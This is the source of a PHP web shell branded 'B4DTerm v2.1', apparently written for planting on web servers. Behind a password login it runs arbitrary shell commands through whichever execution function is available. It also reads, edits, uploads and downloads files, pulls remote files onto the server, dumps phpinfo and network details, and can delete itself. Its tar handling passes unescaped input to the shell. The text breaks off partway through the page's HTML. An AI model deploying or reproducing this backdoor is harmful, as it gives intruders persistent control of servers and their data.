<?php
session_save_path(sys_get_temp_dir());
session_start();
error_reporting(0);
@ini_set('display_errors', 0);
@set_time_limit(0);

$data_store = '$2y$10$hV98QcCsi2h0xSFSzOOSJuccQTZWjSzydYET4dxZIY0sKHsiFtQyG';

$access_granted = false;

if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true) {
    $client_address = $_SERVER['REMOTE_ADDR'];
    if (!isset($_SESSION['access_ip']) || $_SESSION['access_ip'] === $client_address) {
        $access_granted = true;
    } else {
        session_destroy();
        session_start();
    }
}

if (isset($_GET['terminate'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

if (!$access_granted) {
    if (isset($_POST['auth_key'])) {
        $input_key = trim($_POST['auth_key']);
        if (!empty($input_key) && password_verify($input_key, $data_store)) {
            $_SESSION['authenticated'] = true;
            $_SESSION['access_ip'] = $_SERVER['REMOTE_ADDR'];
            $_SESSION['access_time'] = time();
            session_regenerate_id(true);
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error_msg = "Invalid authentication";
        }
    }
    die("<!DOCTYPE html><html class='dark'><head><meta name='viewport' content='width=device-width,initial-scale=1'><title>B4DTerm v2.1</title><script src='https://cdn.tailwindcss.com'></script><style>.bg-terminal{background-color:#000}.border-terminal{border-color:#27272a}.text-accent{color:#10b981}.font-mono{font-family:monospace}</style></head><body class='bg-neutral-950 h-screen flex justify-center items-center font-mono text-xs'><div class='terminal-window bg-terminal border border-terminal rounded-xl shadow-2xl p-6 w-full max-w-sm'><div class='flex items-center gap-2 mb-4 border-b pb-2 border-neutral-800'><div class='w-2 h-2 rounded-full bg-red-500'></div><div class='w-2 h-2 rounded-full bg-yellow-500'></div><div class='w-2 h-2 rounded-full bg-emerald-500'></div><span class='font-bold text-gray-200 ml-2'>Secure Terminal</span><span class='text-gray-600 ml-auto'>© Pawline</span></div><div class='text-center mb-6'><h1 class='text-lg font-bold text-accent'>SECURE ACCESS</h1><p class='text-gray-500'>Authentication Required</p>" . (isset($error_msg) ? "<p class='text-red-500 text-sm mt-2'>$error_msg</p>" : "") . "</div><form method='post' class='space-y-4'><div class='relative'><span class='absolute left-3 top-1/2 -translate-y-1/2 text-accent font-bold'>#</span><input type='password' name='auth_key' class='w-full bg-neutral-900 border border-neutral-800 text-white pl-7 pr-4 py-2 rounded focus:outline-none focus:border-accent placeholder-neutral-600 text-sm tracking-wide' placeholder='' autofocus></div><button type='submit' class='w-full bg-accent/20 border border-accent/30 text-accent py-2 rounded text-sm font-semibold hover:bg-accent/30 transition-colors'>Authenticate</button></form><div class='mt-6 text-center text-neutral-600 text-[10px]'>ACCESS AT YOUR OWN RISK</div></div></body></html>");
}

$session_expire = 3600;
if (isset($_SESSION['access_time']) && (time() - $_SESSION['access_time'] > $session_expire)) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

if (!isset($_SESSION['current_path'])) $_SESSION['current_path'] = getcwd();

function scan_directory($dir) {
    $items = [];
    if (is_dir($dir)) {
        $entries = scandir($dir);
        foreach ($entries as $entry) {
            if ($entry != '.' && $entry != '..') {
                $full_path = $dir . '/' . $entry;
                $items[] = [
                    'name' => $entry,
                    'is_dir' => is_dir($full_path),
                    'size' => is_file($full_path) ? filesize($full_path) : 0,
                    'modified' => filemtime($full_path)
                ];
            }
        }
    }
    usort($items, function($a, $b) {
        return $b['modified'] - $a['modified'];
    });
    return $items;
}

function generate_path($path) {
    $segments = explode('/', trim($path, '/'));
    $output = '';
    
    if (empty($segments[0])) {
        return '<span class="text-emerald-300">/</span>';
    }
    
    foreach ($segments as $idx => $segment) {
        if ($segment === '') continue;
        
        if ($idx > 0) {
            $output .= '<span class="text-gray-600 mx-1"><i class="fas fa-chevron-right text-[8px]"></i></span>';
        }
        
        if ($idx === 0 && $segment === 'home') {
            $output .= '<span class="text-emerald-300 hover:text-emerald-200 transition-colors flex items-center gap-1">';
            $output .= '<i class="fas fa-home text-xs"></i>';
            $output .= '<span>' . htmlspecialchars($segment) . '</span>';
            $output .= '</span>';
        } else {
            $output .= '<span class="text-emerald-300 hover:text-emerald-200 transition-colors">' . htmlspecialchars($segment) . '</span>';
        }
    }
    
    return $output;
}

function format_file_size($bytes) {
    if ($bytes >= 1073741824) {
        return number_format($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        return number_format($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        return number_format($bytes / 1024, 2) . ' KB';
    } elseif ($bytes > 1) {
        return $bytes . ' bytes';
    } elseif ($bytes == 1) {
        return $bytes . ' byte';
    } else {
        return '0 bytes';
    }
}

if (isset($_GET['fetch'])) {
    $target_file = $_SESSION['current_path'] . '/' . $_GET['fetch'];
    if (file_exists($target_file)) {
        $save_name = $_GET['saveas'] ?? basename($target_file);
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.$save_name.'"');
        header('Content-Length: ' . filesize($target_file));
        readfile($target_file);
        exit;
    }
}

if (isset($_POST['view_file'])) {
    $file_path = $_SESSION['current_path'] . '/' . $_POST['view_file'];
    if (file_exists($file_path) && is_file($file_path)) {
        $file_content = file_get_contents($file_path);
        echo json_encode(['status' => true, 'data' => $file_content]);
    } else {
        echo json_encode(['status' => false, 'message' => 'File not found']);
    }
    exit;
}

if (isset($_POST['update_file'])) {
    $file_path = $_SESSION['current_path'] . '/' . $_POST['update_file'];
    $new_content = $_POST['data'];
    if (file_put_contents($file_path, $new_content) !== false) {
        echo json_encode(['status' => true]);
    } else {
        echo json_encode(['status' => false, 'message' => 'Write operation failed']);
    }
    exit;
}

if (isset($_POST['remote_fetch'])) {
    $remote_url = $_POST['url'];
    $local_name = $_POST['remote_filename'] ?? basename($remote_url);
    
    if (!filter_var($remote_url, FILTER_VALIDATE_URL)) {
        echo json_encode(['status' => false, 'message' => 'Invalid URL format']);
        exit;
    }
    
    $destination = $_SESSION['current_path'] . '/' . $local_name;
    
    $remote_data = @file_get_contents($remote_url);
    if ($remote_data !== false && file_put_contents($destination, $remote_data) !== false) {
        echo json_encode(['status' => true, 'path' => $destination, 'size' => strlen($remote_data)]);
    } else {
        echo json_encode(['status' => false, 'message' => 'Download failed']);
    }
    exit;
}

if (isset($_POST['network_info'])) {
    $client_ip = $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
    $server_ip = $_SERVER['SERVER_ADDR'];
    $host = gethostname();
    
    echo json_encode([
        'status' => true,
        'client' => $client_ip,
        'server' => $server_ip,
        'hostname' => $host
    ]);
    exit;
}

if (isset($_POST['php_info'])) {
    ob_start();
    phpinfo();
    $phpinfo = ob_get_clean();
    
    // Extract only the body content
    preg_match('/<body[^>]*>(.*?)<\/body>/is', $phpinfo, $matches);
    $phpinfo_body = isset($matches[1]) ? $matches[1] : $phpinfo;
    
    echo json_encode([
        'status' => true,
        'html' => $phpinfo_body
    ]);
    exit;
}

if (isset($_POST['compress_action'])) {
    $action = $_POST['compress_action'];
    $target = $_POST['compress_target'] ?? '';
    $archive_name = $_POST['archive_name'] ?? '';
    
    $current_path = $_SESSION['current_path'];
    $target_path = $current_path . '/' . $target;
    $archive_path = $current_path . '/' . $archive_name;
    
    $response = ['status' => false, 'message' => ''];
    
    if ($action === 'zip') {
        if (!class_exists('ZipArchive')) {
            $response['message'] = 'ZipArchive extension not available';
        } elseif (!file_exists($target_path)) {
            $response['message'] = 'Target not found';
        } else {
            $zip = new ZipArchive();
            if ($zip->open($archive_path, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
                if (is_dir($target_path)) {
                    $files = new RecursiveIteratorIterator(
                        new RecursiveDirectoryIterator($target_path),
                        RecursiveIteratorIterator::LEAVES_ONLY
                    );
                    
                    foreach ($files as $name => $file) {
                        if (!$file->isDir()) {
                            $filePath = $file->getRealPath();
                            $relativePath = substr($filePath, strlen($target_path) + 1);
                            $zip->addFile($filePath, $relativePath);
                        }
                    }
                } else {
                    $zip->addFile($target_path, basename($target_path));
                }
                
                $zip->close();
                $response['status'] = true;
                $response['message'] = "Archive created: " . basename($archive_path);
                $response['path'] = $archive_path;
            } else {
                $response['message'] = 'Failed to create archive';
            }
        }
    } elseif ($action === 'unzip') {
        if (!class_exists('ZipArchive')) {
            $response['message'] = 'ZipArchive extension not available';
        } elseif (!file_exists($target_path)) {
            $response['message'] = 'Archive not found';
        } elseif (strtolower(pathinfo($target_path, PATHINFO_EXTENSION)) !== 'zip') {
            $response['message'] = 'File is not a ZIP archive';
        } else {
            $zip = new ZipArchive();
            if ($zip->open($target_path) === TRUE) {
                // Determine extraction path
                if (!empty($archive_name)) {
                    $extract_path = $current_path . '/' . $archive_name;
                } else {
                    // Use filename without extension as folder name
                    $extract_path = $current_path . '/' . pathinfo($target, PATHINFO_FILENAME);
                }
                
                // Create extraction directory if it doesn't exist
                if (!is_dir($extract_path)) {
                    if (!mkdir($extract_path, 0755, true)) {
                        $response['message'] = 'Failed to create extraction directory';
                        echo json_encode($response);
                        exit;
                    }
                }
                
                // Extract all files
                $extracted = $zip->extractTo($extract_path);
                $zip->close();
                
                if ($extracted) {
                    $response['status'] = true;
                    $response['message'] = "Extracted to: " . basename($extract_path);
                    $response['path'] = $extract_path;
                    $response['files_extracted'] = true;
                } else {
                    $response['message'] = 'Failed to extract archive (no files extracted)';
                }
            } else {
                $response['message'] = 'Failed to open archive (invalid or corrupted ZIP)';
            }
        }
    } elseif ($action === 'tar') {
        if (!file_exists($target_path)) {
            $response['message'] = 'Target not found';
        } else {
            $compress_cmd = is_dir($target_path) ? '-czf' : '-czf';
            $cmd = "tar $compress_cmd '$archive_path' '$target' 2>&1";
            chdir($current_path);
            exec($cmd, $output, $return_code);
            
            if ($return_code === 0 && file_exists($archive_path)) {
                $response['status'] = true;
                $response['message'] = "TAR archive created: " . basename($archive_path);
                $response['path'] = $archive_path;
            } else {
                $response['message'] = 'TAR command failed: ' . implode("\n", $output);
            }
        }
    } elseif ($action === 'untar') {
        if (!file_exists($target_path)) {
            $response['message'] = 'Archive not found';
        } elseif (!preg_match('/\.(tar\.gz|tgz|tar)$/i', $target)) {
            $response['message'] = 'File is not a TAR archive (.tar.gz, .tgz, .tar)';
        } else {
            $extract_path = $current_path;
            if (!empty($archive_name)) {
                $extract_path .= '/' . $archive_name;
                if (!is_dir($extract_path)) {
                    mkdir($extract_path, 0755, true);
                }
            }
            
            $cmd = "tar -xzf '$target' -C '$extract_path' 2>&1";
            chdir($current_path);
            exec($cmd, $output, $return_code);
            
            if ($return_code === 0) {
                $response['status'] = true;
                $response['message'] = "TAR archive extracted to: " . basename($extract_path);
                $response['path'] = $extract_path;
            } else {
                $response['message'] = 'TAR extract failed: ' . implode("\n", $output);
            }
        }
    }
    
    echo json_encode($response);
    exit;
}

// Fungsi extract zip standalone (opsional)
if (isset($_POST['extract_zip'])) {
    $zip_file = $_POST['zip_file'] ?? '';
    $extract_to = $_POST['extract_to'] ?? '';
    
    $current_path = $_SESSION['current_path'];
    $zip_path = $current_path . '/' . $zip_file;
    
    $response = ['status' => false, 'message' => ''];
    
    if (!class_exists('ZipArchive')) {
        $response['message'] = 'ZipArchive extension not available';
    } elseif (!file_exists($zip_path)) {
        $response['message'] = 'ZIP file not found';
    } elseif (strtolower(pathinfo($zip_path, PATHINFO_EXTENSION)) !== 'zip') {
        $response['message'] = 'File is not a ZIP archive';
    } else {
        $zip = new ZipArchive();
        if ($zip->open($zip_path) === TRUE) {
            // Determine extraction directory
            if (empty($extract_to)) {
                $extract_to = pathinfo($zip_file, PATHINFO_FILENAME);
            }
            
            $extract_path = $current_path . '/' . $extract_to;
            
            // Create extraction directory
            if (!is_dir($extract_path)) {
                if (!mkdir($extract_path, 0755, true)) {
                    $response['message'] = 'Failed to create extraction directory';
                    echo json_encode($response);
                    exit;
                }
            }
            
            // Count total files for progress (optional)
            $fileCount = $zip->numFiles;
            
            // Extract all files
            if ($zip->extractTo($extract_path)) {
                $zip->close();
                
                // Verify extraction by checking if any files were extracted
                $extracted_files = glob($extract_path . '/*');
                if (count($extracted_files) > 0) {
                    $response['status'] = true;
                    $response['message'] = "Successfully extracted {$fileCount} files to: " . basename($extract_path);
                    $response['path'] = $extract_path;
                    $response['file_count'] = $fileCount;
                } else {
                    $response['message'] = 'Archive extracted but no files found (might be empty)';
                }
            } else {
                $zip->close();
                $response['message'] = 'Failed to extract files from archive';
            }
        } else {
            $response['message'] = 'Cannot open ZIP file (may be corrupted or invalid format)';
        }
    }
    
    echo json_encode($response);
    exit;
}

function detect_capabilities() {
    $execution_methods = [
        'shell_exec',
        'exec',
        'passthru',
        'system',
        'popen',
        'proc_open'
    ];
    
    shuffle($execution_methods);
    
    foreach ($execution_methods as $method) {
        if (function_exists($method)) {
            if ($method === 'shell_exec') {
                $test = @shell_exec('echo ' . md5(time()));
                if ($test !== false && trim($test) === md5(time())) {
                    return $method;
                }
            } elseif ($method === 'exec') {
                $output = null;
                $result = @exec('echo ' . md5(time()), $output);
                if ($result !== false && isset($output[0]) && $output[0] === md5(time())) {
                    return $method;
                }
            } elseif ($method === 'passthru') {
                ob_start();
                @passthru('echo ' . md5(time()), $return_code);
                $output = ob_get_clean();
                if (trim($output) === md5(time())) {
                    return $method;
                }
            } elseif ($method === 'system') {
                ob_start();
                $result = @system('echo ' . md5(time()), $return_code);
                $output = ob_get_clean();
                if ($result !== false && trim($output) === md5(time())) {
                    return $method;
                }
            } elseif ($method === 'popen') {
                $handle = @popen('echo ' . md5(time()), 'r');
                if ($handle !== false) {
                    $output = fread($handle, 1024);
                    pclose($handle);
                    if (trim($output) === md5(time())) {
                        return $method;
                    }
                }
            } elseif ($method === 'proc_open') {
                $descriptors = [
                    0 => ["pipe", "r"],
                    1 => ["pipe", "w"],
                    2 => ["pipe", "w"]
                ];
                
                $process = @proc_open('echo ' . md5(time()), $descriptors, $pipes);
                if (is_resource($process)) {
                    $output = stream_get_contents($pipes[1]);
                    fclose($pipes[0]);
                    fclose($pipes[1]);
                    fclose($pipes[2]);
                    proc_close($process);
                    
                    if (trim($output) === md5(time())) {
                        return $method;
                    }
                }
            }
        }
    }
    
    return 'disabled';
}

function process_instruction($instruction) {
    $method = detect_capabilities();
    $result_output = '';
    $execution_success = false;
    
    if ($method === 'disabled') {
        return ['output' => '', 'method' => 'disabled', 'success' => false];
    }
    
    chdir($_SESSION['current_path']);
    
    if (strpos($instruction, '2>&1') === false && strpos($instruction, '2>') === false) {
        $instruction .= ' 2>&1';
    }
    
    switch ($method) {
        case 'shell_exec':
            $result_output = @shell_exec($instruction);
            $execution_success = ($result_output !== false && $result_output !== null);
            break;
            
        case 'exec':
            $output_array = [];
            $last_line = @exec($instruction, $output_array, $return_code);
            $result_output = implode("\n", $output_array);
            $execution_success = ($return_code === 0);
            break;
            
        case 'passthru':
            ob_start();
            @passthru($instruction, $return_code);
            $result_output = ob_get_clean();
            $execution_success = ($return_code === 0);
            break;
            
        case 'system':
            ob_start();
            $last_line = @system($instruction, $return_code);
            $result_output = ob_get_clean();
            $execution_success = ($return_code === 0);
            break;
            
        case 'popen':
            $handle = @popen($instruction, 'r');
            if ($handle) {
                while (!feof($handle)) {
                    $result_output .= fread($handle, 4096);
                }
                $return_code = pclose($handle);
                $execution_success = ($return_code === 0);
            } else {
                $execution_success = false;
            }
            break;
            
        case 'proc_open':
            $descriptors = [
                0 => ["pipe", "r"],
                1 => ["pipe", "w"],
                2 => ["pipe", "w"]
            ];
            
            $process = @proc_open($instruction, $descriptors, $pipes);
            if (is_resource($process)) {
                fclose($pipes[0]);
                
                $result_output = stream_get_contents($pipes[1]);
                $error_output = stream_get_contents($pipes[2]);
                
                fclose($pipes[1]);
                fclose($pipes[2]);
                
                $return_code = proc_close($process);
                
                if (empty($result_output) && !empty($error_output)) {
                    $result_output = $error_output;
                }
                
                $execution_success = ($return_code === 0);
            } else {
                $execution_success = false;
            }
            break;
            
        default:
            $result_output = "Execution method unavailable";
            $execution_success = false;
    }
    
    if ($result_output === false) $result_output = '';
    if ($result_output === null) $result_output = '';
    
    return [
        'output' => $result_output,
        'method' => $method,
        'success' => $execution_success
    ];
}

if (isset($_POST['command'])) {
    header('Content-Type: application/json');
    
    // Rate limiting sederhana
    if (!isset($_SESSION['command_count'])) {
        $_SESSION['command_count'] = 0;
        $_SESSION['command_time'] = time();
    }
    
    $current_time = time();
    if ($current_time - $_SESSION['command_time'] > 60) {
        $_SESSION['command_count'] = 0;
        $_SESSION['command_time'] = $current_time;
    }
    
    $_SESSION['command_count']++;
    if ($_SESSION['command_count'] > 150) {
        echo json_encode(['output' => 'Rate limit exceeded. Please wait...', 'error' => true]);
        exit;
    }
    
    $user_input = trim($_POST['command']);
    $response = ['output' => '', 'path' => $_SESSION['current_path'], 'method' => 'disabled', 'success' => false, 'error' => false];

    if ($user_input === 'remove_system') {
        if (unlink(__FILE__)) {
            $response['output'] = "System removed successfully.";
            session_destroy();
        } else {
            $response['output'] = "Removal failed.";
            $response['error'] = true;
        }
        echo json_encode($response);
        exit;
    }

    if (strpos($user_input, 'cd ') === 0) {
        $new_path = substr($user_input, 3);
        $previous_path = $_SESSION['current_path'];
        chdir($_SESSION['current_path']);
        if (@chdir($new_path)) {
            $updated_path = getcwd();
            $_SESSION['current_path'] = $updated_path;
            $response['path'] = $_SESSION['current_path'];
            $response['output'] = "Directory changed:\n" .
                                  "  From: " . $previous_path . "\n" .
                                  "  To:   " . $updated_path;
        } else {
            $response['output'] = "Error: Path not found - " . $new_path; 
            $response['error'] = true;
        }
        echo json_encode($response);
        exit;
    }

    $execution_result = process_instruction($user_input);
    
    $response['output'] = $execution_result['output'];
    $response['method'] = $execution_result['method'];
    $response['success'] = $execution_result['success'];
    $response['error'] = !$execution_result['success'];
    
    if (empty($response['output']) && $response['success'] && !$response['error']) {
        $response['output'] = "✓ Command executed (no output)";
    }
    
    echo json_encode($response);
    exit;
}

if (isset($_FILES['upload_data'])) {
    $upload_path = $_SESSION['current_path'] . '/' . basename($_FILES['upload_data']['name']);
    $upload_status = move_uploaded_file($_FILES['upload_data']['tmp_name'], $upload_path);
    echo json_encode(['status' => $upload_status, 'path' => $upload_path]);
    exit;
}

$detected_method = detect_capabilities();
$directory_contents = scan_directory($_SESSION['current_path']);
?>

<!DOCTYPE html>

<html lang="id" class="dark">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
<title>B4DTerm v2.1 by Pawline</title>
<script src="https://cdn.tailwindcss.com"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&display=swap');

::-webkit-scrollbar{width:4px;height:4px}::-webkit-scrollbar-track{background:transparent}::-webkit-scrollbar-thumb{background:#333;border-radius:2px}
.g{background:rgba(10,10,10,0.9);backdrop-filter:blur(10px)}
.modal{background:rgba(0,0,0,0.8);backdrop-filter:blur(5px)}
.quick-scroll{display:flex;overflow-x:auto;gap:6px;padding:8px}
.quick-scroll::-webkit-scrollbar{height:3px}
.output-bg{
background-image:url('https://mfiles.alphacoders.com/101/thumb-1920-1012645.png');
background-size:cover;
background-position:center;
background-attachment:fixed;
position:absolute;
inset:0;
}
.output-content{
background:rgba(0,0,0,0.75);
backdrop-filter:blur(4px);
position:absolute;
inset:0;
}
body{
font-family: 'JetBrains Mono', monospace;
}
.file-item{
transition: all 0.2s ease;
}
.file-item:hover{
background: rgba(255,255,255,0.05);
transform: translateX(2px);
}
.modal-grid{
display: grid;
grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
gap: 8px;
max-height: 200px;
overflow-y: auto;
}

.breadcrumb-container {
-ms-overflow-style: none;
scrollbar-width: none;
}
.breadcrumb-container::-webkit-scrollbar{
display: none;
}

.php-badge {
background: linear-gradient(135deg, rgba(119, 77, 143, 0.2) 0%, rgba(77, 57, 143, 0.1) 100%);
border: 1px solid rgba(139, 92, 246, 0.3);
}

/* Auto Complete Styles */
.autocomplete-container {
    position: relative;
    width: 100%;
}

.autocomplete-suggestions {
    position: absolute;
    bottom: 100%;
    left: 0;
    right: 0;
    background: rgba(0, 0, 0, 0.95);
    border: 1px solid rgba(16, 185, 129, 0.3);
    border-radius: 6px;
    max-height: 200px;
    overflow-y: auto;
    z-index: 1000;
    backdrop-filter: blur(10px);
    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.5);
}

.autocomplete-item {
    padding: 8px 12px;
    cursor: pointer;
    border-bottom: 1px solid rgba(255, 255, 255, 0.05);
    font-size: 12px;
    display: flex;
    align-items: center;
    gap: 8px;
    transition: all 0.2s ease;
}

.autocomplete-item:hover,
.autocomplete-item.selected {
    background: rgba(16, 185, 129, 0.15);
    color: #10b981;
}

.autocomplete-item .type {
    font-size: 10px;
    color: rgba(255, 255, 255, 0.4);
    background: rgba(255, 255, 255, 0.1);
    padding: 2px 6px;
    border-radius: 3px;
    margin-left: auto;
}

.autocomplete-item .shortcut {
    font-size: 10px;
    color: rgba(255, 255, 255, 0.5);
}

/* Mobile Optimizations */
@media (max-width: 640px) {
    .terminal-window {
        border-radius: 0.75rem;
        margin: 0;
        height: 100dvh !important;
    }
    .quick-scroll {
        padding: 6px;
        gap: 4px;
    }
    .quick-scroll button {
        padding: 5px 8px !important;
        font-size: 10px !important;
        height: 32px;
    }
    .quick-scroll button i {
        font-size: 9px !important;
    }
    .breadcrumb-text {
        font-size: 11px;
    }
    .php-version {
        font-size: 10px;
        padding: 4px 8px;
    }
    .modal {
        padding: 8px;
    }
    .modal > div {
        max-height: 90vh;
        max-width: 95vw;
    }
    .autocomplete-suggestions {
        max-height: 150px;
    }
    .autocomplete-item {
        padding: 10px;
        font-size: 13px;
    }
    .quick-scroll button span {
        font-size: 9px;
    }
}

/* Toast Notification - VISIBLE */
.toast-notification {
    position: fixed;
    bottom: 20px;
    left: 50%;
    transform: translateX(-50%);
    background: rgba(0, 0, 0, 0.95);
    border: 1px solid rgba(16, 185, 129, 0.4);
    color: #10b981;
    padding: 12px 20px;
    border-radius: 8px;
    z-index: 9999;
    animation: slideInUp 0.3s ease, fadeOut 0.3s ease 2.7s forwards;
    font-size: 13px;
    backdrop-filter: blur(10px);
    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.7);
    max-width: 90vw;
    text-align: center;
    font-weight: 500;
}

@keyframes slideInUp {
    from {
        transform: translateX(-50%) translateY(100%);
        opacity: 0;
    }
    to {
        transform: translateX(-50%) translateY(0);
        opacity: 1;
    }
}

@keyframes fadeOut {
    from {
        opacity: 1;
    }
    to {
        opacity: 0;
    }
}

/* Touch-friendly improvements */
button, .file-item {
    -webkit-tap-highlight-color: transparent;
}

input, textarea, button {
    font-size: 16px !important; /* Prevent zoom on iOS */
}

/* Scroll arrows for mobile */
.scroll-arrows {
    position: absolute;
    right: 10px;
    top: 50%;
    transform: translateY(-50%);
    display: flex;
    flex-direction: column;
    gap: 4px;
    z-index: 10;
}

.scroll-arrow {
    width: 24px;
    height: 24px;
    background: rgba(0, 0, 0, 0.7);
    border: 1px solid rgba(16, 185, 129, 0.3);
    border-radius: 4px;
    color: #10b981;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    font-size: 10px;
}

.scroll-arrow:hover {
    background: rgba(16, 185, 129, 0.2);
}

/* Compact modal for mobile */
@media (max-width: 768px) {
    .modal-grid {
        grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
        gap: 6px;
    }
    .quick-scroll {
        position: relative;
        padding-right: 40px;
    }
}

/* Desktop scroll arrows */
@media (min-width: 769px) {
    .scroll-arrows {
        display: flex;
    }
}

/* Button text smaller */
.btn-text-small {
    font-size: 10px !important;
}

.quick-action-btn {
    font-size: 10px !important;
    padding: 5px 10px !important;
    height: 32px;
    display: flex !important;
    align-items: center !important;
    justify-content: center !important;
}

.quick-action-btn i {
    font-size: 10px !important;
    margin-right: 4px !important;
}

.quick-action-btn span {
    font-size: 10px !important;
}

/* Border Animation for Terminal Window */
.terminal-window {
    position: relative;
    overflow: hidden;
    border: 1px solid transparent;
}

.terminal-window::before {
    content: '';
    position: absolute;
    top: -2px;
    left: -2px;
    right: -2px;
    bottom: -2px;
    background: linear-gradient(45deg, 
        #10b981, #3b82f6, #8b5cf6, #10b981, 
        #3b82f6, #8b5cf6, #10b981);
    background-size: 400% 400%;
    z-index: -1;
    animation: borderFlow 8s linear infinite;
    border-radius: 14px;
}

.terminal-window::after {
    content: '';
    position: absolute;
    top: -1px;
    left: -1px;
    right: -1px;
    bottom: -1px;
    background: rgba(0, 0, 0, 0.95);
    border-radius: 13px;
    z-index: -1;
}

@keyframes borderFlow {
    0% {
        background-position: 0% 50%;
    }
    50% {
        background-position: 100% 50%;
    }
    100% {
        background-position: 0% 50%;
    }
}

/* Break word for long paths */
.break-word {
    word-break: break-all;
    overflow-wrap: break-word;
}

/* PHP Info Modal specific styles */
.php-info-table {
    background: rgba(0, 0, 0, 0.9);
    color: #fff;
    font-family: 'JetBrains Mono', monospace;
    font-size: 12px;
    width: 100%;
    border-collapse: collapse;
}

.php-info-table td {
    padding: 4px 8px;
    border: 1px solid rgba(255, 255, 255, 0.1);
}

.php-info-table tr:nth-child(even) {
    background: rgba(255, 255, 255, 0.05);
}

.php-info-table h1, .php-info-table h2 {
    color: #10b981;
    margin: 15px 0 10px 0;
}

.php-info-table .e {
    background: rgba(16, 185, 129, 0.1);
    font-weight: bold;
    color: #10b981;
}

.php-info-table .v {
    color: #d1d5db;
}

.php-info-table .h {
    background: rgba(139, 92, 246, 0.1);
    color: #8b5cf6;
    text-align: center;
    font-weight: bold;
}

/* Compress status */
#compressStatus {
    transition: all 0.3s ease;
}
</style>

</head>
<body class="bg-neutral-950 flex items-center justify-center h-[100dvh] p-2 sm:p-6 text-gray-400 overflow-hidden" style="font-family: 'JetBrains Mono', monospace;">

<!-- Create Folder Modal -->
<div id="createFolderModal" class="fixed inset-0 modal hidden items-center justify-center z-50 p-4">
    <div class="bg-black border border-blue-500/30 rounded-xl w-full max-w-md flex flex-col">
        <div class="flex items-center justify-between p-4 border-b border-blue-500/30 bg-blue-900/10">
            <h3 class="text-blue-400 font-bold text-sm"><i class="fas fa-folder-plus mr-2"></i>Create New Folder</h3>
            <button onclick="closeCreateFolderModal()" class="text-gray-500 hover:text-white"><i class="fas fa-times"></i></button>
        </div>
        <div class="p-4 space-y-3">
            <div>
                <label class="text-blue-400 text-xs block mb-1"><i class="fas fa-folder mr-1"></i>Folder Name:</label>
                <input type="text" id="folderNameInput" class="w-full bg-neutral-900 border border-blue-500/30 rounded px-3 py-2 text-white placeholder-gray-500 text-sm" placeholder="folder_name" autofocus>
            </div>
            <div>
                <label class="text-blue-400 text-xs block mb-1"><i class="fas fa-location-dot mr-1"></i>Current Path:</label>
                <div class="text-gray-300 text-xs bg-neutral-900/50 p-2 rounded border border-blue-500/20 break-word"><?= $_SESSION['current_path'] ?></div>
            </div>
        </div>
        <div class="flex gap-2 p-4 border-t border-blue-500/30 bg-blue-900/10">
            <button onclick="createFolderSubmit()" class="bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-500 flex-1 text-sm"><i class="fas fa-check mr-2"></i>Create</button>
            <button onclick="closeCreateFolderModal()" class="bg-neutral-700 text-white px-4 py-2 rounded hover:bg-neutral-600 flex-1 text-sm"><i class="fas fa-times mr-2"></i>Cancel</button>
        </div>
    </div>
</div>

<!-- Create File Modal -->
<div id="createFileModal" class="fixed inset-0 modal hidden items-center justify-center z-50 p-4">
    <div class="bg-black border border-green-500/30 rounded-xl w-full max-w-md flex flex-col">
        <div class="flex items-center justify-between p-4 border-b border-green-500/30 bg-green-900/10">
            <h3 class="text-green-400 font-bold text-sm"><i class="fa-regular fa-file mr-2"></i>Create New File</h3>
            <button onclick="closeCreateFileModal()" class="text-gray-500 hover:text-white"><i class="fas fa-times"></i></button>
        </div>
        <div class="p-4 space-y-3">
            <div>
                <label class="text-green-400 text-xs block mb-1"><i class="fas fa-file mr-1"></i>File Name:</label>
                <input type="text" id="fileNameInput" class="w-full bg-neutral-900 border border-green-500/30 rounded px-3 py-2 text-white placeholder-gray-500 text-sm" placeholder="file_name.ext" autofocus>
            </div>
            <div>
                <label class="text-green-400 text-xs block mb-1"><i class="fas fa-align-left mr-1"></i>Initial Content (Optional):</label>
                <textarea id="fileContentInput" class="w-full bg-neutral-900 border border-green-500/30 rounded px-3 py-2 text-white text-sm h-24 resize-none placeholder-gray-500" placeholder="File content..."></textarea>
            </div>
            <div>
                <label class="text-green-400 text-xs block mb-1"><i class="fas fa-location-dot mr-1"></i>Current Path:</label>
                <div class="text-gray-300 text-xs bg-neutral-900/50 p-2 rounded border border-green-500/20 break-word"><?= $_SESSION['current_path'] ?></div>
            </div>
        </div>
        <div class="flex gap-2 p-4 border-t border-green-500/30 bg-green-900/10">
            <button onclick="createFileSubmit()" class="bg-green-600 text-white px-4 py-2 rounded hover:bg-green-500 flex-1 text-sm"><i class="fas fa-check mr-2"></i>Create</button>
            <button onclick="closeCreateFileModal()" class="bg-neutral-700 text-white px-4 py-2 rounded hover:bg-neutral-600 flex-1 text-sm"><i class="fas fa-times mr-2"></i>Cancel</button>
        </div>
</div>
</div>

<!-- Rename Modal -->
<div id="renameModal" class="fixed inset-0 modal hidden items-center justify-center z-50 p-4">
    <div class="bg-black border border-purple-500/30 rounded-xl w-full max-w-2xl flex flex-col">
        <div class="flex items-center justify-between p-4 border-b border-purple-500/30 bg-purple-900/10">
